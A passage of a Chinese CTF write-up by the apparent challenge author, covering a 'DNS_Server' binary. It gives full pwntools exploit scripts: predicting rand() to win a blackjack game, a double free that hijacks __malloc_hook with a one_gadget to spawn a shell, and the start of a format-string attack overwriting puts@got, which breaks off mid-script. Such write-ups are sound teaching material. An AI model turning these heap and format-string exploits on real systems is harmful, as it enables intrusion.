class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">last = list()</span><br><span class="line"></span><br><span class="line">ori = <span class="number">-1</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">libc=CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>)/<span class="number">60</span>)</span><br><span class="line">p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b set_motto\nb set_name')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.20.11'</span>,  <span class="number">2111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randcard</span><span class="params">(dealer)</span>:</span></span><br><span class="line"><span class="keyword">global</span> last,ori</span><br><span class="line"><span class="keyword">if</span> len(last)&gt;<span class="number">0</span>:</span><br><span class="line">num = last[<span class="number">0</span>]%<span class="number">13</span>+<span class="number">1</span></span><br><span class="line">last = last[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ori = libc.rand()</span><br><span class="line">num = ori%<span class="number">13</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> num &gt;= <span class="number">12</span>:</span><br><span class="line">num = <span class="number">10</span></span><br><span class="line"><span class="keyword">elif</span> num == <span class="number">11</span>:</span><br><span class="line"><span class="keyword">if</span> dealer&lt;=<span class="number">10</span>:</span><br><span class="line">num = <span class="number">11</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num = num</span><br><span class="line"><span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> ori</span><br><span class="line">player = <span class="number">0</span></span><br><span class="line">dealer = <span class="number">0</span></span><br><span class="line">player_flag = <span class="number">0</span></span><br><span class="line">dealer_flag = <span class="number">0</span></span><br><span class="line">Hit = <span class="number">0</span></span><br><span class="line">Stay = <span class="number">0</span></span><br><span class="line">getrand()<span class="comment">#,last</span></span><br><span class="line">player+=randcard(player)</span><br><span class="line"><span class="comment">#print '--'</span></span><br><span class="line">p.recvuntil(<span class="string">'Your Total is '</span>)</span><br><span class="line">tmp =int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> (tmp!= player):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] rand num1 wrong !with %d vs %d'</span>%(tmp,player)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'The Dealer Has a Total of '</span>)</span><br><span class="line">dealer+=randcard(dealer)</span><br><span class="line">tmp =int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> (tmp!= dealer):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] rand num2 wrong !%d vs %d'</span>%(tmp,dealer)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> player == <span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]1 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> player&lt;=<span class="number">21</span>:</span><br><span class="line"><span class="keyword">if</span> player_flag!=<span class="number">1</span>:</span><br><span class="line">card_type = getrand()</span><br><span class="line">card_num  = randcard(player)</span><br><span class="line"><span class="keyword">if</span> (player + card_num )&lt;=<span class="number">21</span>:</span><br><span class="line">player+=card_num</span><br><span class="line">Hit +=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">last.append(card_type)</span><br><span class="line">last.append(ori)</span><br><span class="line">player_flag =<span class="number">1</span></span><br><span class="line">Stay = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dealer&lt;<span class="number">17</span>:</span><br><span class="line">dealer += randcard(dealer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dealer==<span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]2 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> dealer&gt;<span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]3 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> dealer&lt;<span class="number">17</span>:</span><br><span class="line">dealer += randcard(dealer)</span><br><span class="line"><span class="keyword">if</span> dealer&gt;=<span class="number">17</span>:</span><br><span class="line"><span class="keyword">if</span> player&gt;=dealer:</span><br><span class="line"><span class="comment">#print '[+++]4 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> player&lt;dealer:</span><br><span class="line"><span class="comment">#print '[+++]5 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> dealer&gt;<span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]6 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (p.recvuntil(Your Total is ))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrand</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> last_two,last</span><br><span class="line"><span class="keyword">if</span> len(last)&gt;<span class="number">0</span>:</span><br><span class="line">num = last[<span class="number">0</span>]</span><br><span class="line">last = last[<span class="number">1</span>:]</span><br><span class="line"><span class="comment">#print '[***]',last</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num = libc.rand()</span><br><span class="line"><span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">win = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xbabe</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Y/N'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">if win&gt;=6:</span></span><br><span class="line"><span class="string">p.recvuntil('flag :')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag = p.recv()</span></span><br><span class="line"><span class="string">flag_decrypt = ""</span></span><br><span class="line"><span class="string">for i in range(len(flag)):</span></span><br><span class="line"><span class="string">flag_decrypt += chr((getrand()%256)^ord(flag[i]))</span></span><br><span class="line"><span class="string">print flag_decrypt</span></span><br><span class="line"><span class="string">exit(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">")b"</span> <span class="keyword">in</span> p.recvuntil(<span class="string">":"</span>):</span><br><span class="line">p.recvuntil(<span class="string">'flag :\n'</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">flag_decrypt = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">flag_decrypt += chr((getrand()%<span class="number">256</span>)^ord(flag[i]))</span><br><span class="line"><span class="keyword">print</span> flag_decrypt</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">' $'</span>)</span><br><span class="line">money = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">result,hit,stay = round()</span><br><span class="line"><span class="keyword">if</span> result :</span><br><span class="line">p.recvuntil(<span class="string">"$"</span>)</span><br><span class="line">p.sendline(str(money))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,hit):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"H"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,stay):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"S"</span>)</span><br><span class="line"><span class="comment">#win+=1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.recvuntil(<span class="string">"$"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,hit):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"H"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,stay):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"S"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please Enter Y for Yes or N for No\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p>题目中有一个增加DNS和删除DNS的功能，在删除功能中按照domain名进行查找并Free，但仅把最后一个DNS节点指针置空，因此，两次Delete会造成Double Free。但是题目中我设置了一个坑点，在于DNS节点Free以前会检查是否是当前用户释放的，也就是name字段，当简单的double free时，由于fd指针位置已经被置为某地址了，所以不能通过检查而释放，此时发现检查字段用的是strcmp来比较的，将name字段设置为‘\x00’*7即可通过检查。比较简单的libc泄露地址方法是用unsorted bin未清空来做，泄露main_arena+88这个地址。以后的方法是常规套路：将Double Free转换为UAF，形成循环链表，劫持长度为0x70的fastbin链到__malloc_hook-0x30，以one_gadget覆写__malloc_hook，在申请堆块时候触发malloc从而拿到shell。</p><p><strong>另外，堆漏洞由于我写错了一个函数，出现了一个堆溢出漏洞，膜一发以非预期解法解出题目的师傅</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.20.11'</span>,  <span class="number">2111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(domain,length,remark,ip)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line">p.recvuntil(<span class="string">"length"</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">p.sendline(remark)</span><br><span class="line">p.recvuntil(<span class="string">"IP:"</span>)</span><br><span class="line">p.send(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line">show(<span class="string">"leak"</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">heap =u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap:'</span>,hex(heap)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name"</span>)</span><br><span class="line">p.sendline(<span class="string">'\0'</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step1"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">add(<span class="string">"step1"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">delete(<span class="string">"step1"</span>)</span><br><span class="line">delete(<span class="string">"step1"</span>)</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step2"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,(p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">"..."</span>).ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">add(<span class="string">"step3"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'3'</span>))</span><br><span class="line">add(<span class="string">"step3"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'3'</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step4"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,(<span class="string">"\0"</span>*<span class="number">0x13</span>+p64(libc.address +<span class="number">0x4526a</span> )+<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'0'</span>)))</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="格式化字符串大礼包"><a href="#格式化字符串大礼包" class="headerlink" title="格式化字符串大礼包"></a>格式化字符串大礼包</h2><p>在set_name函数中有一个明显的格式化字符串漏洞，这个漏洞很多队伍拿来做地址泄露了，实际上也是可用的。首先七个字节，可用来写本函数中的rbp，向该位置用%hn写2字节\x00。在写完之后，在login函数的栈就被迁移到原来的栈的低地址位置了，而在set_motto函数中可以对这部分内存预先设置一下，可以达到控制scanf格式化字符串的目的，将这个格式化字符串劫持到堆上去，泄露堆地址的方法与Double Free中泄露方法是一致的，达到控制格式化字符串以后，需要考虑如何将scanf的格式化字符串用好。与格式化字符串在堆或bss段上的printf格式化字符串利用思路类似，可以在栈上先找一个地址链，向第一个地址写入，再对第二个地址写入，从而达到任意地址写，最终劫持puts@got 为system，以show_motto函数触发漏洞就可以拿到shell了。</p><p>利用流程是：以堆泄露libc、堆地址-&gt;在堆上预先布置好scanf格式化字符串-&gt;以set_motto预先布置好栈上数据-&gt;调用set_name对login函数做栈迁移-&gt;利用login函数的scanf写got表-&gt;触发show_motto函数拿到shell</p><p><strong><em>这个就是一个简化版本的胖哈勃题目，出在这里想看一下有什么解法是我非预期的，当时线下赛的时候没有人用这个方法来做，还是没有想到上面提到的那个劫持返回地址…</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b set_motto\nb set_name'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.20.17'</span>,  <span class="number">40111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(domain,length,remark,ip)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line">p.recvuntil(<span class="string">"length"</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">p.sendline(remark)</span><br><span class="line">p.recvuntil(<span class="string">"IP:"</span>)</span><br><span class="line">p.send(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line">show(<span class="string">"leak"</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">heap =u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap:'</span>,hex(heap)</span><br><span class="line">add(<span class="string">"fmt"</span>,<span class="number">0x50</span>,<span 